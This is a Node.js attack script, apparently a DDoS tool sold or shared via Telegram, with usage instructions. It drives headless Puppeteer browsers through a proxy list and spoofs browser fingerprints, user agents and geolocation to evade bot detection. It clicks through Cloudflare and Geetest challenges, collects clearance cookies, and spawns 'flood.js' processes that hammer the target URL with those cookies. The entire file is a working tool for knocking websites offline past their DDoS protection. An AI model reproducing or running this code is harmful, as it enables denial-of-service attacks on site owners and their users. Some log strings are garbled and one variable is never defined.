const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const UAParser = require('ua-parser-js');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();

puppeteer.use(stealthPlugin);
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m",
  COLOR_PURPLE: "\x1b[35m",
  COLOR_CYAN: "\x1b[36m",
  COLOR_BLUE: "\x1b[34m",
  COLOR_BRIGHT_RED: "\x1b[91m",
  COLOR_BRIGHT_GREEN: "\x1b[92m",
  COLOR_BRIGHT_YELLOW: "\x1b[93m",
  COLOR_BRIGHT_BLUE: "\x1b[94m",
  COLOR_BRIGHT_PURPLE: "\x1b[95m",
  COLOR_BRIGHT_CYAN: "\x1b[96m",
  COLOR_BRIGHT_WHITE: "\x1b[97m",
  BOLD: "\x1b[1m",
  ITALIC: "\x1b[3m"
};

const { spawn } = require("child_process");

const colored = (colorCode, text, isBold = false, isItalic = false) => {
  const boldStart = isBold ? colors.BOLD : '';
  const italicStart = isItalic ? colors.ITALIC : '';
  return italicStart + boldStart + colorCode + text + colors.COLOR_RESET;
};


if (process.argv.length < 8) {
  console.clear();
  console.log(`\n${colored(colors.COLOR_BRIGHT_RED, '                               CRISXTOP BROWSER NEW UPDATE 2024')}`);
  console.log('');
  console.log(colored(colors.COLOR_CYAN, "                                        t.me/NEEDMORELOLI"));
  console.log('');
  console.log(`${colored(colors.COLOR_BRIGHT_YELLOW, '                                         27 August, 2024', true)}\n`);
  console.log('                          -------------------------------------------');
  console.log(`
    ${colored(colors.COLOR_BRIGHT_CYAN, 'PUPPETEER v1.2')} | Latest update For Cloudflare Captcha Bypass , Speed Captcha Solving With More Options Added Can Help The Solution Become More Optimized
    
    ${colored(colors.COLOR_BRIGHT_BLUE, 'Usage:')}
        ${colored(colors.COLOR_BRIGHT_RED, 'node browser.js [targetURL] [threads] [proxyFile] [rates] [duration] true/false')}
        node browser.js https://example.com 8 proxy.txt 64 200 true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true

    ${colored(colors.COLOR_BRIGHT_BLUE, 'Options:')}
    ${colored(colors.COLOR_BRIGHT_BLUE, '----------------------------------------------------------------------------------------------------------')}
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --fin         ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Enable browser fingerprint                       |')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --load        ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Optimize memory and CPU usage                    |')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --headers     ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -SET EXTRA HEADERS                                |')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --ipv6     ')} ${colored(colors.COLOR_BRIGHT_GREEN, '   true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -SET IPV6 USING                                   |')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --blocked     ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'Indonesia/USA/China/Brazil')} ${colored(colors.COLOR_BRIGHT_PURPLE, '           -Allows emulating location addresses for geoblocks|')} 
    ${colored(colors.COLOR_BRIGHT_PURPLE, '| --reconnect   ')} ${colored(colors.COLOR_BRIGHT_GREEN, 'true/false')} ${colored(colors.COLOR_BRIGHT_PURPLE, '                           -Accept Reconnect Page If It Has Problem          |')}
    ${colored(colors.COLOR_BRIGHT_BLUE, '----------------------------------------------------------------------------------------------------------')}
  `);
  process.exit(1);
}




const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const flood = process.argv[7];
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
function getCurrentTime() {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
}
const options = [

  { flag: '--load', value: get_option('--load') },
  { flag: '--ipv6', value: get_option('--ipv6') },
  { flag: '--fin', value: get_option('--fin') },
  { flag: '--headers', value: get_option('--headers') },
  { flag: '--reconnect', value: get_option('--reconnect') }

];
const blockedCountry = get_option('--blocked');
function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}
function check_proxy(proxy) {
  return new Promise((resolve, reject) => {
    request({
      url: "https://iruko.org/cdn-cgi/trace",
      proxy: "http://" + proxy,
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      },
      timeout: 5000 // Set a timeout of 5 seconds
    }, (err, res, body) => {
      if (!err && res.statusCode === 200) {
        resolve(proxy);
      } else {
        reject(err);
      }
    });
  });
}

async function isProxyValid(browserProxy) {
  try {
    await check_proxy(browserProxy);
    return browserProxy;
  } catch (error) {
    throw new Error();
  }
} 


async function handleCFChallenge(page) {
await sleep(18);
  const captchaContainer = await page.$(".spacer > div:first-child");
  if (captchaContainer) {
  try {
    const boundingBox = await captchaContainer.boundingBox();
    if (boundingBox) {
     const { x, y } = await captchaContainer.boundingBox();
      await page.mouse.click(x + 20, y + 20);
      
    } else {
      }
    } catch (error) {
    if (enabled('reconnect')) {
    await page.reload();
    await sleep(5);
    }
    }
  } else {
  }

await sleep(8);
}
async function solveGeetestSlide(page) {


await sleep(10);
    try {
        await page.waitForSelector('.geetest_slider', { visible: true });
        const slider = await page.$('.geetest_slider');
        await slider.click();
        const sliderHandle = await page.$('.geetest_slider');
        const box = await sliderHandle.boundingBox();
        
        if (!box) {
            throw new Error();
        }

        
        const moveDistance = box.width - 20; 

        
        await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
        await page.mouse.down();
        await page.mouse.move(box.x + moveDistance, box.y + box.height / 2, { steps: 20 });
        await page.mouse.up();
        await sleep(8);


        if (isSolved) {
            console.log('Geetest slide dã du?c x? lý thành công.');
        } else {
            console.log('X? lý Geetest slide không thành công.');
        }
    } catch (error) {
        console.error('L?i khi x? lý Geetest slide:', error);
    }

}
const locations = [
  { name: 'USA', latitude: 37.7749, longitude: -122.4194 },
  { name: 'China', latitude: 39.9042, longitude: 116.4074 },
  { name: 'Brazil', latitude: -23.5505, longitude: -46.6333 },
  { name: 'Indonesia', latitude: -6.2088, longitude: 106.8456 },
  { name: 'Vietnam', latitude: 21.0285, longitude: 105.8542 }  
];


function getLocationByName(name) {
  return locations.find(location => location.name.toLowerCase() === name.toLowerCase());
}

async function setGeolocation(page, latitude, longitude) {
  console.log(`Setting geolocation to latitude: ${latitude}, longitude: ${longitude}`);
  await page.setGeolocation({ latitude, longitude });
  await sleep(2);
}

async function isBlocked(page) {
  const title = await page.title();
  console.log(`Page title: ${title}`);
  return title === "Attention Required! | Cloudflare";
}

async function applyGeolocation(page) {
  if (blockedCountry) {
    const location = getLocationByName(blockedCountry);
    if (location) {
      console.log(`Applying geolocation for ${location.name}`);
      await setGeolocation(page, location.latitude, location.longitude);
      await sleep(5); 
      const blocked = await isBlocked(page);
      if (blocked) {
        console.log(`Access blocked at location ${location.name}`);
        await switchProxy();
      } else {
        console.log(`Access granted with location ${location.name}`);
      }
    } else {
      console.log(`Country "${blockedCountry}" not found in the location list.`);
    }
  } else {
    console.log('No blocked country specified.');
  }
}

async function detectChallenge(browserProxy, page) {
  const [title, content] = await Promise.all([page.title(), page.content()]);

  if (title === "Attention Required! | Cloudflare") {
    console.log("Detected Cloudflare blocking page.");
    if (blockedCountry) {
      console.log(`Trying geolocation for blocked country: ${blockedCountry}`);
      await applyGeolocation(page);
     
      await page.reload({ waitUntil: ['networkidle2'] });
      const newTitle = await page.title();
      if (newTitle === "Attention Required! | Cloudflare") {
        console.log(`Still blocked after applying geolocation.`);
        await switchProxy();
        throw new Error("Proxy blocked");
      }
    } else {
      throw new Error("Proxy blocked");
    }
  }

if (content.includes("challenge-platform")) {
    console.log(colored(colors.COLOR_CYAN, "FOUND CF challenge " + browserProxy));
    await handleCFChallenge(page);
    
        return;
    }
  
   

  console.log(colored(colors.COLOR_PURPLE, "No challenge detected " + browserProxy));
  await sleep(10);
}



async function openBrowser(targetURL, browserProxy) {
const randomVersion = Math.floor(Math.random() * 7) + 120;
 const userAgents = [
   `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${randomVersion}.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15`,
   `Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`, 
`Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36`, 
   `Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53`
 ];
 
 function getSecChUa(userAgent) {
        const parser = new UAParser(userAgent);
        const browserVersion = parser.getBrowser().version.split('.')[0];
        const brands = [
            `"Google Chrome";v="${browserVersion}"`,
            `"Chromium";v="${browserVersion}"`,
            `"Not-A.Brand";v="99"`
        ];
        return brands.join(', ');
    }

    function getPlatform(userAgent) {
        const parser = new UAParser(userAgent);
        const osName = parser.getOS().name;
        const osVersion = parser.getOS().version || 'Unknown';
        return {
            name: osName,
            version: osVersion
        };
    }
 const randomIndex = Math.floor(Math.random() * userAgents.length);
 const randomUA = userAgents[randomIndex];
 const secChUa = getSecChUa(randomUA);
 const platform = getPlatform(randomUA);
const [ip, port, username, password] = browserProxy.split(':');
 const promise = async (resolve, reject) => {
   const browser = await puppeteer.launch({
     headless: true,
     ignoreHTTPSErrors: true,
     args: [
     "--proxy-server=http://" + ip + ":" + port,
       '--disable-web-security',
       '--no-sandbox',
       '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
       '--enable-experimental-web-platform-features',
       '--disable-dev-shm-usage',
       '--disable-infobars',
       '--disable-software-rasterizer',
       '--ignore-certificate-errors',
       "--no-first-run",
       '--disable-popup-blocking',
       '--disable-gpu',
       '--incognito',
       '--disable-extensions',
       '--force-color-profile=srgb',
       '--metrics-recording-only',
       '--password-store=basic',
       '--use-mock-keychain',
       '--export-tagged-pdf',
       '--no-default-browser-check',
       '--disable-background-mode',
       '--enable-features=NetworkService,NetworkServiceInProcess,LoadCryptoTokenExtension,PermuteTLSExtensions',
       '--disable-features=FlashDeprecationWarning,EnablePasswordsAccountStorage',
       '--deny-permission-prompts',
       '--disable-search-engine-choice-screen',
       '--test-type',
       '--color-scheme=' + randomElement(['dark', 'light']),
       '--disable-browser-side-navigation',
       "--user-agent="
       + randomUA
      ],
    ignoreDefaultArgs: ['--enable-automation']
});
   try {
     const message1 = colored(colors.COLOR_RESET, "Start Run In: " + browserProxy);
console.log(message1);
      const [page] = await browser.pages();
      if (enabled('ipv6')) {
      await page.authenticate({ username, password });
      }
      await page.setCacheEnabled(true);
      
      
             
      const client = page._client();
      

     
if (enabled('headers')) {
    await page.setExtraHTTPHeaders({
        'Sec-Fetch-User': '?1',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'DNT': '1',
        'sec-ch-ua': getSecChUa(randomUA), 
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'Referer': targetURL,
        
    });
};


    
    if (enabled('load')) {
      const blockedResources = ['BlockCssAssets', 'BlockImages', 'BlockFonts', 'BlockIcons', 'BlockMedia'];
      await page.setRequestInterception(true);
      

      page.on('request', (req) => {
        if (blockedResources.includes(req.resourceType())) {
          req.abort();
        } else {
          req.continue();
        }
      });
    }
 
 if (enabled('fin')) {
    // Inject custom script to set sec-ch-ua and manipulate NavigatorUAData
    await page.evaluateOnNewDocument(({ secChUa, platform }) => {
        const userAgentData = Object.create(NavigatorUAData.prototype);
        const brands = secChUa.split(', ').map(brand => {
            const [name, version] = brand.split(';v=');
            return { brand: name.trim(), version };
        });

        Object.defineProperty(userAgentData, 'brands', {
            get: function () {
                return brands;
            }
        });

        Object.defineProperty(userAgentData, 'mobile', {
            get: function () {
                return navigator.userAgent.includes('Mobile');
            }
        });

        Object.defineProperty(userAgentData, 'platform', {
            get: function () {
                return platform.name;
            }
        });

        NavigatorUAData.prototype.getHighEntropyValues = function (hints) {
            const highEntropyValues = {
                brands,
                mobile: navigator.userAgent.includes('Mobile'),
                platform: platform.name,
                platformVersion: platform.version
            };

            const getters = {
                architecture: () => ({ architecture: 'x86' }),
                bitness: () => ({ bitness: '64' }),
                model: () => ({ model: '' }),
                platformVersion: () => ({ platformVersion: platform.version }),
                uaFullVersion: () => ({
                    uaFullVersion: navigator.userAgent.split(' ')[1].split('/')[1]
                }),
                fullVersionList: () => ({ fullVersionList: brands })
            };

            const result = {};
            hints.forEach(hint => {
                if (getters[hint]) {
                    Object.assign(result, getters[hint]());
                }
            });
            return { ...highEntropyValues, ...result };
        };

        Object.defineProperty(window.navigator, 'userAgentData', {
            get: function () {
                return userAgentData;
            }
        });
    }, { secChUa, platform });

    await page.evaluateOnNewDocument(() => {
        const setProperty = (obj, prop, value) => {
            Object.defineProperty(obj, prop, {
                get: () => value,
                configurable: true,
                enumerable: true
            });
        };

        const navigatorProperties = {
            languages: ['en-US', 'en'],
            hardwareConcurrency: Math.floor(Math.random() * 6) + 2, // More realistic concurrency
            vendor: 'Google Inc.',
            webdriver: false,
            mediaDevices: {
                enumerateDevices: () => Promise.resolve([
                    { kind: 'audioinput' },
                    { kind: 'videoinput' }
                ])
            },
            permissions: {
                query: (param) => {
                    if (param.name === 'notifications') {
                        return Promise.resolve({ state: Notification.permission });
                    }
                    return Promise.resolve({ state: 'granted' });
                }
            },
            connection: {
                effectiveType: Math.random() > 0.6 ? '4g' : '5g',
                downlink: (Math.random() * 5 + 10).toFixed(1),
                rtt: Math.floor(Math.random() * 20) + 40,
                saveData: false
            }
        };

        Object.keys(navigatorProperties).forEach(prop => {
            setProperty(navigator, prop, navigatorProperties[prop]);
        });

        const screenProperties = {
            width: Math.random() > 0.6 ? 1920 : 1366,
            height: Math.random() > 0.6 ? 1080 : 768,
            availWidth: Math.random() > 0.6 ? 1920 : 1366,
            availHeight: Math.random() > 0.6 ? 1080 : 768,
            colorDepth: Math.random() > 0.5 ? 24 : 32,
            pixelDepth: Math.random() > 0.5 ? 24 : 32,
            orientation: { type: Math.random() > 0.6 ? 'landscape-primary' : 'portrait-primary', angle: 0 }
        };

        Object.keys(screenProperties).forEach(prop => {
            setProperty(screen, prop, screenProperties[prop]);
        });

        const storageMock = () => {
            const store = {};
            return {
                getItem: key => store[key] || null,
                setItem: (key, value) => { store[key] = value.toString(); },
                removeItem: key => { delete store[key]; },
                clear: () => { for (const key in store) delete store[key]; }
            };
        };

        Object.defineProperty(window, 'localStorage', { value: storageMock() , writable: false });
        Object.defineProperty(window, 'sessionStorage', { value: storageMock() , writable: false });

        const windowProperties = {
            innerWidth: screenProperties.width,
            innerHeight: screenProperties.height,
            outerWidth: screenProperties.width,
            outerHeight: screenProperties.height,
        };

        Object.keys(windowProperties).forEach(prop => {
            setProperty(window, prop, windowProperties[prop]);
        });

        setProperty(Intl.DateTimeFormat().resolvedOptions(), 'timeZone', 'America/New_York');
        setProperty(navigator, 'userAgent', window.navigator.userAgent.replace(/HeadlessChrome/gi, 'Chrome'));

        setProperty(window, 'WebGLRenderingContext', {
            get: () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return null;
                return {
                    getParameter: (param) => {
                        if (param === 37446) return 'Intel Open Source Technology Center';
                        if (param === 37447) return 'Mesa DRI Intel(R) HD Graphics 620 (KBL GT2)';
                        return gl.getParameter(param);
                    }
                };
            }
        });
    });
}




       const userAgent = await page.evaluate(() => navigator.userAgent);
      const devices = [
   // Desktop and laptop computers
    { width: 1280, height: 800, deviceScaleFactor: 1, isMobile: false, hasTouch: false },
    { width: 1440, height: 900, deviceScaleFactor: 2, isMobile: false, hasTouch: false },
    { width: 1600, height: 900, deviceScaleFactor: 1, isMobile: false, hasTouch: false },
    { width: 1920, height: 1080, deviceScaleFactor: 1, isMobile: false, hasTouch: false },
    { width: 2560, height: 1440, deviceScaleFactor: 2, isMobile: false, hasTouch: false },
    { width: 3840, height: 2160, deviceScaleFactor: 2, isMobile: false, hasTouch: false },

    // tablet 
    { width: 768, height: 1024, deviceScaleFactor: 2, isMobile: true, hasTouch: true },
    { width: 800, height: 1280, deviceScaleFactor: 2, isMobile: true, hasTouch: true },
    { width: 1024, height: 1366, deviceScaleFactor: 2, isMobile: true, hasTouch: true },
    { width: 1280, height: 800, deviceScaleFactor: 1.5, isMobile: true, hasTouch: true },
    
    // Mobile Phone
    { width: 375, height: 667, deviceScaleFactor: 2, isMobile: true, hasTouch: true },
    { width: 414, height: 896, deviceScaleFactor: 3, isMobile: true, hasTouch: true },
    { width: 360, height: 640, deviceScaleFactor: 3, isMobile: true, hasTouch: true },
    { width: 320, height: 568, deviceScaleFactor: 2, isMobile: true, hasTouch: true },
    { width: 412, height: 732, deviceScaleFactor: 3, isMobile: true, hasTouch: true },
    { width: 360, height: 740, deviceScaleFactor: 4, isMobile: true, hasTouch: true },
    { width: 360, height: 780, deviceScaleFactor: 4, isMobile: true, hasTouch: true },
];
      const randomDevice = devices[Math.floor(Math.random() * devices.length)];
      await page.setViewport({
        width: randomDevice.width,
        height: randomDevice.height,
        deviceScaleFactor: randomDevice.deviceScaleFactor,
        isMobile: randomDevice.isMobile,
        hasTouch: randomDevice.hasTouch,
       });


    page.on("framenavigated", (frame) => {
        if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
      });
     page.setDefaultNavigationTimeout(10000);
     
     

    

     await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
     
     await detectChallenge(browserProxy, page, reject);
     
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
     

     resolve({
      title: title,
      browserProxy: browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: userAgent,
      
      
    });

  } catch (exception) {
    
  } finally {
  await browser.close();
  }
}
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            const currentTime = getCurrentTime();
            if (response) {
            if (response.title === "Just a moment...") {
                    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
                    return;
                }
            if (!response.cookies.includes("cf_chl") || (response.cookies.includes("cf_chl") && response.cookies.length > 32)) {

                const details = `\nTIME : ${currentTime} || ${response.browserProxy} || User Agent: ${response.userAgent} || Cookie: ${response.cookies}`;
                console.log(details);

                if (flood === 'true') {
                for (let i = 0; i < 2; i++) {
                spawn("node", [
                    "flood.js",
                    targetURL,
                    "120",
                    "12",
                    response.browserProxy,
                    rates,
                    
                    response.cookies,
                    response.userAgent
                ]);
                }
                }
                }
                }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}


var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);
async function __main__() {
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    queue.push({ browserProxy: browserProxy });
  }
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
}
__main__();
setTimeout(function(){
   process.exit();
}, process.argv[6] * 1000);
